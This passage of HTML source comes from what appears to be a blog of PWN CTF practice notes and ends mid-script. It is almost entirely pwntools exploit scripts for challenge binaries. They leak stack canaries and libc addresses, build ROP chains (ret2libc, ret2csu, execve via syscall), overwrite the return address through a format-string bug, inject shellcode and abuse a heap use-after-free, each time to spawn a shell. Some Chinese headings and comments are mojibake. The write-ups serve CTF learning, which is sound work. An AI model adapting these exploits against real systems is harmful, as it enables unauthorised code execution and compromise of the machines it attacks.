class="number">0x0000000000400ace</span> : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400ad0</span> : pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400ad2</span> : pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400acb</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400acf</span> : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line"><span class="number">0x00000000004006c0</span> : pop rbp ; ret</span><br><span class="line"><span class="number">0x0000000000400ad3</span> : pop rdi ; ret</span><br><span class="line"><span class="number">0x0000000000400ad1</span> : pop rsi ; pop r15 ; ret</span><br><span class="line"><span class="number">0x0000000000400acd</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004005c9</span> : ret</span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>] </span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./list&quot;</span>)</span><br><span class="line"><span class="comment"># p=remote(&quot;175.27.249.18&quot;,31766)   </span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./list&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your option:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000400ad3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004005c9 : ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x400ad3</span></span><br><span class="line">ret=<span class="number">0x4005c9</span></span><br><span class="line">main_addr=<span class="number">0x4007c1</span></span><br><span class="line">change(<span class="number">19</span>,rdi)</span><br><span class="line">change(<span class="number">20</span>,puts_got)</span><br><span class="line">change(<span class="number">21</span>,puts_plt)</span><br><span class="line">change(<span class="number">22</span>,main_addr)</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;puts_addr:&quot;</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_addr=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;base_addr:&quot;</span>+<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">system_addr=base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">19</span>,rdi)</span><br><span class="line">change(<span class="number">20</span>,binsh_addr)</span><br><span class="line">change(<span class="number">21</span>,system_addr)</span><br><span class="line">change(<span class="number">22</span>,main_addr)</span><br><span class="line">exit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="Normal-shellcode"><a href="#Normal-shellcode" class="headerlink" title="Normal_shellcode"></a>Normal_shellcode</h4><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250225113806.png" alt="Pasted image 20250225113806"></p><h2 id="NISACTF"><a href="#NISACTF" class="headerlink" title="NISACTF"></a>NISACTF</h2><h3 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./ez_heap&#x27;</span>)</span><br><span class="line">p = ELF(<span class="string">&quot;ez_heap&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="girl-friend"><a href="#girl-friend" class="headerlink" title="girl_friend"></a>girl_friend</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]   </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;girlfriend&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./girlfriend&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">num</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name_size,name</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Her name size is :&quot;</span>,name_size)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Her name is :&quot;</span>,name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,index)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">backdoor_addr=<span class="number">0x400B9C</span></span><br><span class="line">add(<span class="string">&quot;16&quot;</span>,p64(backdoor_addr))</span><br><span class="line">add(<span class="string">&quot;40&quot;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delete(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">delete(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;16&quot;</span>,p64(backdoor_addr))</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="é¹¤åŸæ¯"><a href="#é¹¤åŸæ¯" class="headerlink" title="é¹¤åŸæ¯"></a>é¹¤åŸæ¯</h2><h3 id="littleof-2021é¹¤åŸæ¯"><a href="#littleof-2021é¹¤åŸæ¯" class="headerlink" title="littleof(2021é¹¤åŸæ¯)"></a>littleof(2021é¹¤åŸæ¯)</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250312131636.png" alt="Pasted image 20250312131636"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./littleof&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./littleof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x49</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow?\n&#x27;</span>,pl1)</span><br><span class="line">data=p.recv()</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+data[<span class="number">0x49</span>:<span class="number">0x49</span>+<span class="number">7</span>]</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040059e : ret</span></span><br><span class="line"><span class="comment"># 0x0000000000400863 : pop rdi ; ret</span></span><br><span class="line">ret=<span class="number">0x40059e</span></span><br><span class="line">pop_rdi=<span class="number">0x400863</span></span><br><span class="line">func=<span class="number">0x4006E2</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(func)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;win&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_addr:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc.address:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;binsh:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;overflow?\n&#x27;</span>,pl1)</span><br><span class="line">data=p.recv()</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+data[<span class="number">0x49</span>:<span class="number">0x49</span>+<span class="number">7</span>]</span><br><span class="line">canary = <span class="built_in">int</span>.from_bytes(canary,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary:&#x27;</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>  +p64(ret)+p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="Geek-Challenge"><a href="#Geek-Challenge" class="headerlink" title="Geek Challenge"></a><strong>Geek Challenge</strong></h2><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">backdoor = <span class="number">0x401256</span></span><br><span class="line">p.sendline(<span class="string">b&quot;A&quot;</span>*(<span class="number">0x18</span>+<span class="number">8</span>) + p64(backdoor))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰"><a href="#ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰" class="headerlink" title="ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰"></a>ä¹°é»‘å—å–½äº†å—ï¼ˆæ•´æ•°æº¢å‡ºï¼Œæ ˆæº¢å‡ºï¼‰</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./syscall&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./syscall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;%p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x0x&#x27;</span>)</span><br><span class="line">base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x4090</span></span><br><span class="line">success(<span class="string">&#x27;base:&#x27;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">rdi=base+<span class="number">0x11f1</span></span><br><span class="line">rsi=base+<span class="number">0x11f3</span></span><br><span class="line">rax=base+<span class="number">0x11f7</span></span><br><span class="line">bss=base+<span class="number">0x4090</span></span><br><span class="line">rdx=base+<span class="number">0x11f5</span></span><br><span class="line">syscall=base+<span class="number">0x11EE</span></span><br><span class="line"></span><br><span class="line">rop=p64(rax)+p64(<span class="number">0</span>)+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi)+p64(bss)+p64(rdx)+p64(<span class="number">0x8</span>)+p64(syscall)</span><br><span class="line">rop+=p64(rax)+p64(<span class="number">0x3b</span>)+p64(rdi)+p64(bss)+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x58</span>+rop</span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice:&#x27;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;feedback&#x27;</span>,payload)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="su"><a href="#su" class="headerlink" title="su~~~~"></a>su~~~~</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./csu&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./csu&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">s = <span class="keyword">lambda</span> s : p.send(s) </span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s) </span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : p.sendafter(n,s) </span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : p.sendlineafter(n,s) </span><br><span class="line">r = <span class="keyword">lambda</span> n : p.recv(n) </span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline() </span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s) </span><br><span class="line">ra = <span class="keyword">lambda</span> : p.recvall() </span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive() </span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) </span></span><br><span class="line"><span class="comment"># u32(p.recvuntil(b&#x27;\\xf7&#x27;)) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(): </span><br><span class="line">    gdb.attach(p) </span><br><span class="line">    pause() </span><br><span class="line"><span class="comment">#=====================================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, last</span>):</span><br><span class="line">    mov_addr = <span class="number">0x4008E0</span></span><br><span class="line">    pop_addr = <span class="number">0x4008FA</span></span><br><span class="line">    fakeebp=<span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x80</span>+fakeebp</span><br><span class="line">    payload += p64(pop_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14)</span><br><span class="line">    payload += p64(<span class="number">1</span>)+p64(mov_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;exit.\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"></span><br><span class="line">read_addr=<span class="number">0x400798</span></span><br><span class="line">csu(<span class="number">0</span>, <span class="number">1</span>, puts_got, puts_got, <span class="number">0</span>, read_addr)</span><br><span class="line"></span><br><span class="line">puts_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_base:&#x27;</span>+<span class="built_in">hex</span>(puts_base))</span><br><span class="line">libc.address = puts_base - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">ogg=<span class="number">0x4f302</span>+libc.address</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ogg)</span><br><span class="line">p.send(payload2)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ID:\n&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;%13$p%14$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;canary =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;rbp =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">ret=rbp-<span class="number">0x18</span></span><br><span class="line">p.send(p64(ret+<span class="number">1</span>)+<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\xEC&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">b&#x27;%18c%6$hhn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?\n&#x27;</span>,<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\x85&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="çœŸçš„èƒ½èµ°åˆ°åé—¨å—"><a href="#çœŸçš„èƒ½èµ°åˆ°åé—¨å—" class="headerlink" title="çœŸçš„èƒ½èµ°åˆ°åé—¨å—"></a>çœŸçš„èƒ½èµ°åˆ°åé—¨å—</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ID:\n&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;%13$p%14$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;canary =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">rbp = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;rbp =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(rbp))</span><br><span class="line"></span><br><span class="line">ret=rbp-<span class="number">0x18</span> <span class="comment">#åŠ¨è°ƒå¯çŸ¥æ­¤ä¸ºè¿”å›åœ°å€rbp-0x18</span></span><br><span class="line">p.send(p64(ret+<span class="number">1</span>)+<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\xEC&#x27;</span>) <span class="comment">#ret+1å³ä¸ºæœ€ç»ˆè¦ä¿®æ”¹çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">b&#x27;%18c%6$hhn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;say?\n&#x27;</span>,<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x38</span> + p64(canary) + p64(rbp)+ <span class="string">b&#x27;\x85&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ç©ºè°ƒ"><a href="#ç©ºè°ƒ" class="headerlink" title="ç©ºè°ƒ"></a>ç©ºè°ƒ</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250307201728.png" alt="Pasted image 20250307201728"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">18839</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(filename)</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span 